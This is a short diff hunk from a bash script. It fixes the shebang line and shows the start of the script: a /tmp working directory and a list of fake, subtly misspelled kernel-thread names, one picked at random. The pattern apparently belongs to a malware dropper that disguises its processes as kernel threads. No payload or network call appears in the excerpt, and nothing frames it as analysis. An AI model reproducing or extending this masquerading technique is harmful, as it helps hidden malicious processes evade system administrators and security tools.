@@ -1,4 +1,4 @@
-!/bin/bash
+#!/bin/bash
 WORK_DIR="/tmp"
 RANDOM_BIN_NAMES=("[cpuhp/0]" "[khungtaskd]" "[blkcg_punt_biio]" "[ipv8_addrconf]" "[mlb]" "[kstrrp]" "[neetns]" "[rcu_gb]")
 RANDOMIZE=$(( (RANDOM % 7)  + 0))
